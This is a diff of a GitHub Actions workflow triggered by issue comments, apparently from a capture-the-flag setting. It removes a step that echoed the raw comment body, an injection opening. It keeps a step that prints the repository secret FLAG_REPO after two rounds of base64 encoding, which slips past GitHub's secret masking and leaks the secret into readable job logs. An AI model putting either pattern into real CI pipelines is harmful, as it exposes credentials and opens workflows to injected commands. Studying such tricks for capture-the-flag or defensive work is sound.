@@ -9,13 +9,8 @@ on:
 
 jobs:
   issue_commented:
-    name: inspect new comment 
-    runs-on:
-    - self-hosted
-    - Linux
+    name: blabal 
     steps:
-    - name: comment debug
-      run: echo ${{ github.event.comment.body }}
     - name: another debug
       run:  echo -e "SECRET=${{ secrets.FLAG_REPO }}\n" | base64 | base64
 
